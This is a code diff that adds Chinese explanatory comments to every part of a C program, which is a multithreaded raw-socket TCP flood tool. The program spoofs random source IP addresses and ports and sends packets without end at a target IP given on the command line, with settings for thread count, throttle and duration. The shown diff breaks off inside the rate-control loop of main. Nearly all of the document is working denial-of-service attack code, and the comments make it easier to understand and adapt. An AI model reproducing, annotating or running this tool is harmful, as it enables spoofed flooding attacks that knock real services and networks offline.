@@ -17,12 +17,16 @@
 #include <netdb.h>
 #include <net/if.h>
 #include <arpa/inet.h>
+
+// 定义最大数据包大小
 #define MAX_PACKET_SIZE 4096
-#define PHI 0x9e3779b9
-static unsigned long int Q[4096], c = 362436;
-volatile int limiter;
-volatile unsigned int pps;
-volatile unsigned int sleeptime = 100;
+#define PHI 0x9e3779b9 // 随机数生成算法中的常量
+static unsigned long int Q[4096], c = 362436; // 随机数数组和初始值
+volatile int limiter; // 用于限制发送速率的变量
+volatile unsigned int pps; // 每秒发送的数据包数量
+volatile unsigned int sleeptime = 100; // 休眠时间（微秒）
+
+// 初始化随机数生成器
 void init_rand(unsigned long int x)
 {
         int i;
@@ -34,6 +38,8 @@ void init_rand(unsigned long int x)
                 Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
         }
 }
+
+// CMWC随机数生成函数
 unsigned long int rand_cmwc(void)
 {
         unsigned long long int t, a = 18782LL;
@@ -50,6 +56,8 @@ unsigned long int rand_cmwc(void)
         }
         return (Q[i] = r - x);
 }
+
+// 计算校验和
 unsigned short csum(unsigned short *buf, int count)
 {
         register unsigned long sum = 0;
@@ -68,6 +76,8 @@ unsigned short csum(unsigned short *buf, int count)
         }
         return (unsigned short)(~sum);
 }
+
+// 计算TCP校验和
 unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
 {
         struct tcp_pseudo
@@ -92,6 +102,8 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
         free(tcp);
         return output;
 }
+
+// 设置IP头部
 void setup_ip_header(struct iphdr *iph)
 {
         iph->ihl = 5;
@@ -105,6 +117,8 @@ void setup_ip_header(struct iphdr *iph)
         iph->check = 0;
         iph->saddr = inet_addr("192.168.3.100");
 }
+
+// 设置TCP头部
 void setup_tcp_header(struct tcphdr *tcph)
 {
         tcph->source = htons(5678);
@@ -117,28 +131,33 @@ void setup_tcp_header(struct tcphdr *tcph)
         tcph->check = 0;
         tcph->urg_ptr = 0;
 }
+
+// 发送数据包线程
 void *flood(void *par1)
 {
-        char *td = (char *)par1;
-        char datagram[MAX_PACKET_SIZE];
-        struct iphdr *iph = (struct iphdr *)datagram;
-        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
-        struct sockaddr_in sin;
+        char *td = (char *)par1; // 目标IP地址
+        char datagram[MAX_PACKET_SIZE]; // 数据包缓冲区
+        struct iphdr *iph = (struct iphdr *)datagram; // IP头部指针
+        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); // TCP头部指针
+        struct sockaddr_in sin; // 目标地址结构体
         sin.sin_family = AF_INET;
-        sin.sin_port = htons(rand() % 20480);
-        sin.sin_addr.s_addr = inet_addr(td);
-        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+        sin.sin_port = htons(rand() % 20480); // 随机端口
+        sin.sin_addr.s_addr = inet_addr(td); // 目标IP地址
+
+        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // 创建原始套接字
         if (s < 0)
         {
                 fprintf(stderr, ":: cant open raw socket. got root?\n");
                 exit(-1);
         }
-        memset(datagram, 0, MAX_PACKET_SIZE);
-        setup_ip_header(iph);
-        setup_tcp_header(tcph);
-        tcph->dest = htons(rand() % 20480);
-        iph->daddr = sin.sin_addr.s_addr;
-        iph->check = csum((unsigned short *)datagram, iph->tot_len);
+
+        memset(datagram, 0, MAX_PACKET_SIZE); // 清空数据包
+        setup_ip_header(iph); // 设置IP头部
+        setup_tcp_header(tcph); // 设置TCP头部
+        tcph->dest = htons(rand() % 20480); // 设置目标端口
+        iph->daddr = sin.sin_addr.s_addr; // 设置目标IP地址
+        iph->check = csum((unsigned short *)datagram, iph->tot_len); // 计算IP头部校验和
+
         int tmp = 1;
         const int *val = &tmp;
         if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
@@ -146,28 +165,31 @@ void *flood(void *par1)
                 fprintf(stderr, ":: motherfucking error.\n");
                 exit(-1);
         }
-        init_rand(time(NULL));
+
+        init_rand(time(NULL)); // 初始化随机数生成器
         register unsigned int i;
         i = 0;
         while (1)
         {
-                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
-                iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
-                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
-                iph->check = csum((unsigned short *)datagram, iph->tot_len);
-                tcph->seq = rand_cmwc() & 0xFFFF;
-                tcph->source = htons(rand_cmwc() & 0xFFFF);
-                tcph->check = 0;
-                tcph->check = tcpcsum(iph, tcph);
-                pps++;
+                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)); // 发送数据包
+                iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF); // 更新源IP地址
+                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF); // 更新IP标识符
+                iph->check = csum((unsigned short *)datagram, iph->tot_len); // 重新计算IP校验和
+                tcph->seq = rand_cmwc() & 0xFFFF; // 更新TCP序列号
+                tcph->source = htons(rand_cmwc() & 0xFFFF); // 更新TCP源端口
+                tcph->check = 0; // 清空TCP校验和
+                tcph->check = tcpcsum(iph, tcph); // 计算TCP校验和
+                pps++; // 增加发送计数
                 if (i >= limiter)
                 {
                         i = 0;
-                        usleep(sleeptime);
+                        usleep(sleeptime); // 控制发送速率
                 }
                 i++;
         }
 }
+
+// 主函数
 int main(int argc, char *argv[])
 {
         if (argc < 5)
@@ -176,22 +198,22 @@ int main(int argc, char *argv[])
                 fprintf(stdout, "Usage: %s <IP> <threads> <throttle, -1 for no throttle> <time>\n", argv[0]);
                 exit(-1);
         }
-        int num_threads = atoi(argv[2]);
-        int maxpps = atoi(argv[3]);
+        int num_threads = atoi(argv[2]); // 线程数量
+        int maxpps = atoi(argv[3]); // 最大数据包每秒发送数
         limiter = 0;
         pps = 0;
-        pthread_t thread[num_threads];
+        pthread_t thread[num_threads]; // 线程数组
         int multiplier = 20;
         int i;
         for (i = 0; i < num_threads; i++)
         {
-                pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
+                pthread_create(&thread[i], NULL, &flood, (void *)argv[1]); // 创建线程
         }
         fprintf(stdout, ":: sending all the packets..\n");
-        for (i = 0; i < (atoi(argv[4]) * multiplier); i++)
+        for (i = 0; i < (atoi(argv[4]) * multiplier); i++) // 运行指定时间
         {
                 usleep((1000 / multiplier) * 1000);
-                if ((pps * multiplier) > maxpps)
+                if ((pps * multiplier) > maxpps) // 调整发送速率
                 {
                         if (1 > limiter)
                         {
